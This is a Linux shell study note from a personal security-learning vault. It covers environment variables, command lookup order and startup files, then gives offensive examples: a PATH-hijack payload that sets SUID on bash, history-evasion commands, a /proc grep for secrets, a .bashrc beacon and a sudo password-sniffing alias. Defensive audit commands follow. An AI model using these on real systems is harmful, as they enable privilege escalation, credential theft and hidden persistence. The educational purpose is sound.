<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 14 — Shell Environment, Command Resolution & Threat Vectors
   ========================================================================= -->

# 🛡️ Day 14: Shell Environment, Command Resolution & Threat Vectors

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Shell State Architecture, Lookup Mechanics, Environment Abuse & Evasion*

---

## 1. Shell State & Variable Architecture

Variables in Linux reside either in **Local Shell Scope** (restricted to the current shell instance) or in the **Global Environment Space** (exported to all child processes spawned by the parent shell).

```
 ┌────────────────────────────────────────────────────────┐
 │            PARENT SHELL INSTANCE (PID 1000)            │
 │                                                        │
 │   LOCAL_VAR="secret"         EXPORTED_VAR="active"     │
 │   (Not passed to child)      (Exported to environment) │
 └──────────────────────────┬─────────────────────────────┘
                            │  [ fork() & execve() ]
                            ▼
 ┌────────────────────────────────────────────────────────┐
 │             CHILD PROCESS (PID 1001)                   │
 │                                                        │
 │   LOCAL_VAR: [ NULL ]        EXPORTED_VAR: "active"    │
 └────────────────────────────────────────────────────────┘
```

### Variable Scoping & Management Commands

* `VAR="value"` — Define a local shell variable (not inherited by subshells).
* `export VAR="value"` — Export variable to the global environment table.
* `declare -x VAR="value"` — Alternative syntax to mark a variable for export.
* `declare -r SECURE_KEY="1337"` — Define a **Read-Only** variable (cannot be modified or unset).
* `unset VAR_NAME` — Remove variable from memory.
* `env` / `printenv` — Print all currently exported environment variables.
* `set` — Print all variables (local, exported, and internal shell functions).

---

## 2. The 6-Stage Command Resolution Pipeline

When a command is executed in the terminal, the shell resolves its identity through a strict 6-stage lookup hierarchy before querying physical storage.

```
       [ Input: "command" ]
               │
               ▼
     1. [ Alias Check ]          ──( Found )──> Execute Alias
               │ (No match)
               ▼
     2. [ Reserved Keywords ]    ──( Found )──> Execute (if, for, while, do)
               │ (No match)
               ▼
     3. [ Shell Functions ]      ──( Found )──> Execute in-memory function
               │ (No match)
               ▼
     4. [ Shell Built-in ]       ──( Found )──> Execute directly in shell (cd, echo, pwd)
               │ (No match)
               ▼
     5. [ Hash Table Cache ]     ──( Found )──> Execute previously resolved path directly
               │ (No match)
               ▼
     6. [ $PATH Binary Lookup ]  ──( Found )──> Execute binary & save to Hash Table
               │ (Not found)
               ▼
     [ ERROR: Command Not Found ]
```

### Command Identification & Cache Diagnostics

```bash
# 1. Precise Resolution Probing (type)
type -a ls                            # Inspect all definitions (aliases, builtins, paths)
type -t cd                            # Print type classification ('builtin', 'alias', 'file')

# 2. Path & Binary Locators
which nmap                            # Scan $PATH and return first matching executable
whereis bash                          # Return binary, source, and man page locations

# 3. Hash Table Management (hash)
hash                                  # Display cache of resolved command paths in current session
hash -r                               # Clear the hash cache table (forces fresh $PATH lookup)
```

---

## 3. Shell Startup Files & Initialization Flow

Configuration files are sourced sequentially based on the session execution mode:

```
┌────────────────────────────────────────────────────────────────────────┐
│                      SHELL EXECUTION MODES                             │
├──────────────────────────┬─────────────────────────────────────────────┤
│ Interactive Login        │ SSH login, Console login (`su - user`)      │
│ Interactive Non-Login    │ New terminal window / Subshell (`bash`)     │
│ Non-Interactive          │ Automated shell script execution (`./run.sh`)│
└──────────────────────────┴─────────────────────────────────────────────┘
```

### Execution Loading Hierarchy

```
[ Interactive Login ]     ──> /etc/profile ──> ~/.bash_profile ──> ~/.bashrc ──> /etc/bash.bashrc
[ Interactive Non-Login ] ──> ~/.bashrc    ──> /etc/bash.bashrc
[ Shell Termination ]     ──> ~/.bash_logout
```

---

## 4. Critical Diagnostic & Security Variables

| Variable | Definition | Security & Operational Relevance |
| :--- | :--- | :--- |
| `$PATH` | Colon-separated directory list for binary search | High-value target for privilege escalation & hijacking |
| `$IFS` | Internal Field Separator (Default: space/tab/newline)| String-tokenization control; input parsing manipulation |
| `$HISTFILE` | Target log file for shell command history | Session monitoring evasion (`$HISTFILE=/dev/null`) |
| `$HISTCONTROL`| Directives for history logging (`ignorespace`) | Hiding commands from audit logs using a leading space |
| `$PROMPT_COMMAND`| Command executed immediately prior to rendering `$PS1` | In-memory keystroke logging and persistent execution |
| `$LD_PRELOAD`| Libraries loaded before standard system libraries | Userland rootkit injection & API hooking |

---

## 5. Cyber Operations & Threat Vectors (Hacker Mindset)

Environment variables and command resolution routines are prime surfaces for execution hijacking, reconnaissance, and anti-forensics.

---

### Vector 1: `$PATH` Hijacking (Local Privilege Escalation)
If a high-privileged script or cronjob calls an executable using a **relative name** (e.g., `backup` instead of `/usr/bin/backup`), an attacker with write access to an early entry in `$PATH` can redirect execution.

```bash
# Scenario: An admin script executes 'service restart' without full path.
# Step 1: Prepend a world-writable directory to current $PATH
export PATH=/tmp/evil_bin:$PATH

# Step 2: Drop weaponized payload named 'service' in /tmp/evil_bin
mkdir -p /tmp/evil_bin
echo '#!/bin/bash' > /tmp/evil_bin/service
echo 'chmod +s /bin/bash' >> /tmp/evil_bin/service
chmod +x /tmp/evil_bin/service

# Step 3: When the script executes 'service', the shell finds /tmp/evil_bin/service FIRST.
```

---

### Vector 2: History Sanitization & Anti-Forensics
During engagements, operators prevent active sessions from writing traces to disk:

```bash
# Method A: Direct File Redirection
export HISTFILE=/dev/null

# Method B: In-Memory History Suppression
set +o history

# Method C: Leading Space Evasion (Requires HISTCONTROL=ignorespace)
# Prefixing any command with a single space skips history recording:
 whoami
```

---

### Vector 3: Memory Credential Harvesting via `/proc`
Processes often inherit cleartext API tokens, database passwords, and runtime secrets inside their environment blocks:

```bash
# Step 1: Target a sensitive running process PID
pgrep -f "python3 app.py"

# Step 2: Read process environment directly from kernel memory
cat /proc/<PID>/environ | tr '\0' '\n' | grep -iE "(key|token|pass|secret)"
```

---

### Vector 4: Startup File Poisoning (Persistence & Backdoors)
Adversaries append commands to persistent user profile files (`~/.bashrc`, `~/.profile`):

```bash
# Append an automated beacon triggered on every interactive login
echo 'nohup /tmp/.agent >/dev/null 2>&1 &' >> ~/.bashrc

# Sudo Password Sniffing Alias:
echo 'alias sudo="read -s -p \"[sudo] password for $USER: \" pass; echo; echo \$pass >> /tmp/.pass; sudo -k; /usr/bin/sudo -S <<< \$pass"' >> ~/.bashrc
```

---

## 6. Defensive Threat Hunting & Resolution Matrix

| Objective | Command / Triage Syntax | Threat / Defensive Focus |
| :--- | :--- | :--- |
| **Audit `$PATH` for Relative Paths** | `echo $PATH \| grep -E "(^\.|:\.:|:\.$)"` | Detects dangerous current-directory `.` in PATH |
| **Audit Writable Paths in `$PATH`** | `find $(echo $PATH \| tr ':' ' ') -maxdepth 0 -perm -0002` | Discovers directories vulnerable to binary injection |
| **Check Active Aliases** | `alias` | Detects backdoored or hijacked command aliases |
| **Inspect System-Wide Profiles** | `ls -la /etc/profile.d/ /etc/bash.bashrc` | Identifies unauthorized system-wide persistent scripts |
| **Audit Session Environment Dumps**| `env \| grep -iE "(proxy|http|ssh|auth)"` | Unmasks exfiltration proxies or leaked credentials |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
